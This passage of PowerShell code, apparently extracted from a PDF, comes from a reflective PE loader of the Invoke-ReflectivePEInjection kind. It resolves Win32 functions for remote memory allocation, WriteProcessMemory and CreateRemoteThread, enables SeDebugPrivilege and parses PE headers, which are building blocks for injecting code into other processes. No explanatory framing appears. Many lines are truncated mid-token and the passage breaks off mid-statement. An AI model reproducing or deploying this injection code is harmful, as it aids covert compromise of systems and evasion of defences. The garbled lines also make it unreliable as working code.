[System.Valu\n$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null\n$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null\n$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()\n$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES Value $TOKEN_PRIVILEGES\nreturn $Win32Types\n}\nFunction Get-Win32Constants\n{\n$Win32Constants = New-Object System.Object\n$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT Value 0x00001000\n$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE Value 0x00002000\n$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01\n$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02\n$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE Value 0x04\n$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY Value 0x08\n$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10\n$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ Value 0x20\n$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE Value 0x40\n$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY Value 0x80\n$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200\n$Win32Constants | Add-Member -MemberType NoteProperty Name IMAGE_REL_BASED_ABSOLUTE -Value 0\n$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW Value 3\n\n```\n\n-----\n\n```\n$Win32Constants | Add Member MemberType NoteProperty Name IMAGE_REL_BASED_DIR64\nValue 10\n$Win32Constants | Add-Member -MemberType NoteProperty Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000\n$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE Value 0x20000000\n$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ Value 0x40000000\n$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE Value 0x80000000\n$Win32Constants | Add-Member -MemberType NoteProperty Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000\n$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT Value 0x4000\n$Win32Constants | Add-Member -MemberType NoteProperty Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002\n$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL Value 0x2000\n$Win32Constants | Add-Member -MemberType NoteProperty Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40\n$Win32Constants | Add-Member -MemberType NoteProperty Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100\n$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000\n$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008\n$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES Value 0x0020\n$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED Value 0x2\n$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN Value 0x3f0\nreturn $Win32Constants\n}\nFunction Get-Win32Functions\n{\n$Win32Functions = New-Object System.Object\n$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc\n$VirtualAllocDelegate = GetDelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])\n$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointe\n$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc\n$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx\n$VirtualAllocExDelegate = GetDelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])\n$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoin\n$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx\n$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy\n$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])\n$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem\n$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy\n$memsetAddr = Get-ProcAddress msvcrt.dll memset\n$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])\n$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem\n\n```\n\n-----\n\n```\n$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset\n$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA\n$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])\n$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer\n$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary Value $LoadLibrary\n$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress\n$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])\n$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoin\n$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress Value $GetProcAddress\n$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress\n$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])\n$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunct\n$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal Value $GetProcAddressOrdinal\n$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree\n$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])\n$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer\n$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree\n$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx\n$VirtualFreeExDelegate = GetDelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])\n$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint\n$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx\n$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect\n$VirtualProtectDelegate = GetDelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])\n$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoin\n$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect\n$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA\n$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])\n$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoi\n$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle Value $GetModuleHandle\n$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary\n$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])\n$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer\n$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary Value $FreeLibrary\n$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess\n  $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])\n  $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoi\n$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess Value $OpenProcess\n\n```\n\n-----\n\n```\n$WaitForSingleObjectAddr Get ProcAddress kernel32.dll WaitForSingleObject\n  $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])\n  $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFun\n$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject Value $WaitForSingleObject\n$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory\n    $WriteProcessMemoryDelegate = GetDelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([B\n    $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateFor\n$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory Value $WriteProcessMemory\n$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory\n    $ReadProcessMemoryDelegate = GetDelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([B\n    $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForF\n$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory Value $ReadProcessMemory\n$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread\n    $CreateRemoteThreadDelegate = GetDelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr])\n    $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateFor\n$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread Value $CreateRemoteThread\n$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread\n    $GetExitCodeThreadDelegate = GetDelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])\n    $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForF\n$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread Value $GetExitCodeThread\n$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken\n    $OpenThreadTokenDelegate = GetDelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])\n    $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFun\n$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken Value $OpenThreadToken\n$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread\n    $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])\n    $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFu\n$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread Value $GetCurrentThread\n$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges\n    $AdjustTokenPrivilegesDelegate = GetDelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])\n    $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegate\n\n```\n\n-----\n\n```\n$Win32Functions | Add Member MemberType NoteProperty Name AdjustTokenPrivileges\nValue $AdjustTokenPrivileges\n$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA\n    $LookupPrivilegeValueDelegate = GetDelegateType @([String], [String], [IntPtr]) ([Bool])\n    $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateF\n$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue Value $LookupPrivilegeValue\n$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf\n    $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])\n    $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFun\n$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf Value $ImpersonateSelf\n    if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {\n  $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx\n      $NtCreateThreadExDelegate = GetDelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntP\n      $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateF\n  $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx Value $NtCreateThreadEx\n    }\n$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process\n    $IsWow64ProcessDelegate = GetDelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])\n    $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunc\n$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process Value $IsWow64Process\n$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread\n    $CreateThreadDelegate = GetDelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefTyp\n    $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFuncti\n$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread Value $CreateThread\n$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree\n$LocalFreeDelegate = Get-DelegateType @([IntPtr])\n$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($\n$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree\nreturn $Win32Functions\n}\nFunction Sub-SignedIntAsUnsigned\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[Int64]\n$Value1,\n[Parameter(Position = 1, Mandatory = $true)]\n\n```\n\n-----\n\n```\n[Int64]\n$Value2\n)\n[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)\n[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)\n[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)\nif ($Value1Bytes.Count -eq $Value2Bytes.Count)\n{\n$CarryOver = 0\nfor ($i = 0; $i -lt $Value1Bytes.Count; $i++)\n{\n$Val = $Value1Bytes[$i] - $CarryOver\nif ($Val -lt $Value2Bytes[$i])\n{\n$Val += 256\n$CarryOver = 1\n}\nelse\n{\n$CarryOver = 0\n}\n[UInt16]$Sum = $Val - $Value2Bytes[$i]\n$FinalBytes[$i] = $Sum -band 0x00FF\n}\n}\nelse\n{\nThrow \"Cannot subtract bytearrays of different sizes\"\n}\nreturn [BitConverter]::ToInt64($FinalBytes, 0)\n}\nFunction Add-SignedIntAsUnsigned\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[Int64]\n$Value1,\n[Parameter(Position = 1, Mandatory = $true)]\n[Int64]\n$Value2\n)\n[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)\n[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)\n[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)\nif ($Value1Bytes.Count -eq $Value2Bytes.Count)\n{\n$CarryOver = 0\nfor ($i = 0; $i -lt $Value1Bytes.Count; $i++)\n{\n[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver\n$FinalBytes[$i] = $Sum -band 0x00FF\nif (($Sum -band 0xFF00) -eq 0x100)\n{\n$CarryOver = 1\n}\n\n```\n\n-----\n\n```\nelse\n{\n$CarryOver = 0\n}\n}\n}\nelse\n{\nThrow \"Cannot add bytearrays of different sizes\"\n}\nreturn [BitConverter]::ToInt64($FinalBytes, 0)\n}\nFunction Compare-Val1GreaterThanVal2AsUInt\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[Int64]\n$Value1,\n[Parameter(Position = 1, Mandatory = $true)]\n[Int64]\n$Value2\n)\n[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)\n[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)\nif ($Value1Bytes.Count -eq $Value2Bytes.Count)\n{\nfor ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)\n{\nif ($Value1Bytes[$i] -gt $Value2Bytes[$i])\n{\nreturn $true\n}\nelseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])\n{\nreturn $false\n}\n}\n}\nelse\n{\nThrow \"Cannot compare byte arrays of different size\"\n}\nreturn $false\n}\nFunction Convert-UIntToInt\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[UInt64]\n$Value\n)\n[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)\nreturn ([BitConverter]::ToInt64($ValueBytes, 0))\n}\nFunction Test-MemoryRangeValid\n\n```\n\n-----\n\n```\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[String]\n$DebugString,\n[Parameter(Position = 1, Mandatory = $true)]\n[System.Object]\n$PEInfo,\n[Parameter(Position = 2, Mandatory = $true)]\n[IntPtr]\n$StartAddress,\n[Parameter(ParameterSetName = \"Size\", Position = 3, Mandatory = $true)]\n[IntPtr]\n$Size\n)\n  [IntPtr]$FinalEndAddress = [IntPtr](AddSignedIntAsUnsigned ($StartAddress) ($Size))\n$PEEndAddress = $PEInfo.EndAddress\nif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)\n{\nThrow \"Trying to write to memory smaller than allocated address range. $DebugString\"\n}\nif ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)\n{\nThrow \"Trying to write to memory greater than allocated address range. $DebugString\"\n}\n}\nFunction Write-BytesToMemory\n{\nParam(\n[Parameter(Position=0, Mandatory = $true)]\n[Byte[]]\n$Bytes,\n[Parameter(Position=1, Mandatory = $true)]\n[IntPtr]\n$MemoryAddress\n)\nfor ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)\n{\n[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$O\n}\n}\nFunction Get-DelegateType\n{\n  Param\n  (\n    [OutputType([Type])]\n    [Parameter( Position = 0)]\n    [Type[]]\n    $Parameters = (New-Object Type[](0)),\n    [Parameter( Position = 1 )]\n    [Type]\n    $ReturnType = [Void]\n  )\n\n```\n\n-----\n\n```\n  $Domain [AppDomain]::CurrentDomain\n  $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')\n  $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.\n  $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)\n  $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed,\n  $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Pu\n  $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')\n  $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot,\n  $MethodBuilder.SetImplementationFlags('Runtime, Managed')\n  Write-Output $TypeBuilder.CreateType()\n}\nFunction Get-ProcAddress\n{\n  Param\n  (\n    [OutputType([IntPtr])]\n    [Parameter( Position = 0, Mandatory = $True )]\n    [String]\n    $Module,\n    [Parameter( Position = 1, Mandatory = $True )]\n    [String]\n    $Procedure\n  )\n  $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |\n    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')\n[-1].Equals('System.dll') }\n  $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethod\n  $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')\n  $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')\n  $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))\n  $tmpPtr = New-Object IntPtr\n  $HandleRef = NewObject System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)\n  WriteOutput $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$Hand\n}\nFunction Enable-SeDebugPrivilege\n{\nParam(\n[Parameter(Position = 1, Mandatory = $true)]\n[System.Object]\n$Win32Functions,\n[Parameter(Position = 2, Mandatory = $true)]\n[System.Object]\n$Win32Types,\n[Parameter(Position = 3, Mandatory = $true)]\n[System.Object]\n$Win32Constants\n)\n\n```\n\n-----\n\n```\n[IntPtr]$ThreadHandle $Win32Functions.GetCurrentThread.Invoke()\nif ($ThreadHandle -eq [IntPtr]::Zero)\n{\nThrow \"Unable to get the handle to the current thread\"\n}\n[IntPtr]$ThreadToken = [IntPtr]::Zero\n[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.\nbor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)\nif ($Result -eq $false)\n{\n$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()\nif ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)\n{\n$Result = $Win32Functions.ImpersonateSelf.Invoke(3)\nif ($Result -eq $false)\n{\nThrow \"Unable to impersonate self\"\n}\n$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_\nbor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)\nif ($Result -eq $false)\n{\nThrow \"Unable to OpenThreadToken.\"\n}\n}\nelse\n{\nThrow \"Unable to OpenThreadToken. Error code: $ErrorCode\"\n}\n}\n[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtim\n$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, \"SeDebugPrivilege\", $PLui\nif ($Result -eq $false)\n{\nThrow \"Unable to call LookupPrivilegeValue\"\n}\n[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32\n[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($\n$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPriv\n$TokenPrivileges.PrivilegeCount = 1\n$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStru\n$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivi\n$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPri\n$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this\nif (($Result -eq $false) -or ($ErrorCode -ne 0))\n\n```\n\n-----\n\n```\n{\n}\n[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)\n}\nFunction Invoke-CreateRemoteThread\n{\nParam(\n[Parameter(Position = 1, Mandatory = $true)]\n[IntPtr]\n$ProcessHandle,\n[Parameter(Position = 2, Mandatory = $true)]\n[IntPtr]\n$StartAddress,\n[Parameter(Position = 3, Mandatory = $false)]\n[IntPtr]\n$ArgumentPtr = [IntPtr]::Zero,\n[Parameter(Position = 4, Mandatory = $true)]\n[System.Object]\n$Win32Functions\n)\n[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero\n$OSVersion = [Environment]::OSVersion.Version\nif (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (NewObject 'Version' 6,2)))\n{\n$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [\n$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()\nif ($RemoteThreadHandle -eq [IntPtr]::Zero)\n{\nThrow \"Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError\"\n}\n}\nelse\n{\n$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPt\n[UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)\n}\nif ($RemoteThreadHandle -eq [IntPtr]::Zero)\n{\n}\nreturn $RemoteThreadHandle\n}\nFunction Get-ImageNtHeaders\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[IntPtr]\n$PEHandle,\n[Parameter(Position = 1, Mandatory = $true)]\n[System.Object]\n$Win32Types\n)\n$NtHeadersInfo = New-Object System.Object\n$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type\n\n```\n\n-----\n\n```\n[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64]\n[UInt64]$dosHeader.e_lfanew))\n$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr Value $NtHeadersPtr\n$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeader\n  if ($imageNtHeaders64.Signature -ne 0x00004550)\n  {\n    throw \"Invalid IMAGE_NT_HEADER signature.\"\n  }\nif ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')\n{\n$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS Value $imageNtHeaders64\n$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true\n}\nelse\n{\n$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeader\n$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS Value $imageNtHeaders32\n$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false\n}\nreturn $NtHeadersInfo\n}\nFunction Get-PEBasicInfo\n{\nParam(\n[Parameter( Position = 0, Mandatory = $true )]\n[Byte[]]\n$PEBytes,\n[Parameter(Position = 1, Mandatory = $true)]\n[System.Object]\n$Win32Types\n)\n$PEInfo = New-Object System.Object\n[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PE\n[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEByte\nNull\n$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes Win32Types $Win32Types\n$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' Value ($NtHeadersInfo.PE64Bit)\n$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)\n$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)\n$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)\n$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)\n[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)\n\n```\n\n-----\n\n```\nreturn $PEInfo\n}\nFunction Get-PEDetailedInfo\n{\nParam(\n[Parameter( Position = 0, Mandatory = $true)]\n[IntPtr]\n$PEHandle,\n[Parameter(Position = 1, Mandatory = $true)]\n[System.Object]\n$Win32Types,\n[Parameter(Position = 2, Mandatory = $true)]\n[System.Object]\n$Win32Constants\n)\nif ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)\n{\nthrow 'PEHandle is null or IntPtr.Zero'\n}\n$PEInfo = New-Object System.Object\n$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types\n$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle\n$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS Value ($NtHeadersInfo.IMAGE_NT_HEADERS)\n$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr Value ($NtHeadersInfo.NtHeadersPtr)\n$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit Value ($NtHeadersInfo.PE64Bit)\n$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)\nif ($PEInfo.PE64Bit -eq $true)\n{\n[IntPtr]$SectionHeaderPtr = [IntPtr](AddSignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Mar\n$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr Value $SectionHeaderPtr\n}\nelse\n{\n[IntPtr]$SectionHeaderPtr = [IntPtr](AddSignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Mar\n$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr Value $SectionHeaderPtr\n}\nif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)\n{\n$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'\n}\nelseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)\n{\n\n```\n\n-----\n\n```\n$PEInfo | Add Member 